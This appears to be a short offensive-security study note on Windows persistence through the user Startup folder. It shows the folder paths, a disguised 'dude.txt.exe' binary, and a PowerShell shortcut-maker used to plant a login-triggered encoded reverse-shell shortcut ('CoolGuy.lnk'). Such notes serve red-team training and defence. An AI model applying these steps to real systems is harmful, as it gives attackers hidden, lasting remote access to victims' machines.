
>[!info]
>This note is still in development.

### Overview
---
An easy method to establish persistence is via the Startup programs directory.  Binaries (or links) thrown in this directory execute at user login.

```powershell
# CMD Path
"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

# PowerShell Path
"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
```

### Example
---
Below example shows a binary titled `dude.txt.exe` being placed in the Startup Programs directory, and being displayed as enabled for Startup in the Task Manager.

![[Pasted image 20230828112507.png]]

(*Notice: the `.exe` file extension was not displayed in Task Manager*)

### Example 2.0
---

```powershell
# PowerShell: Create a shortcut that takes arguments
function Make-Shortcut {
	param ( [string]$Executable, [string]$ExeArguments, [string]$DestinationPath )
	$WshShell = New-Object -comObject WScript.Shell
	$Shortcut = $WshShell.CreateShortcut($DestinationPath)
	$Shortcut.TargetPath = $Executable
	$Shortcut.Arguments = $ExeArguments
	$Shortcut.Save()
}

# Example: Create a PowerShell reverse shell shortcut in StartUp Programs
Make-Shortcut -Executable powershell.exe -ExeArguments "-e <base64_revshell>" -DestinationPath "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\CoolGuy.lnk"

# Example: Create a link to a binary using CMD
cmd /c mklink <binary> <destination.lnk>
```